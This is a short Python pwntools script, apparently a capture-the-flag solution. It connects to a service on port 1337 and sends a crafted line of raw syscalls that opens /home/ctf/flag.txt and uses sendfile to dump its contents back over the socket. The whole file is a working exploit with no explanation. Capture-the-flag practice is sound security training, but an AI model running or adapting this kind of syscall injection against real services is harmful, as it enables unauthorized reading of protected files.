from pwn import *
from time import sleep

r = remote("0.0.0.0", 1337)

r.sendline('syscall(2, "/home/ctf/flag.txt", 0, 0) syscall(40, 1, 6, 0) syscall(40, 1, 6, 0)')

print(r.recv().decode())
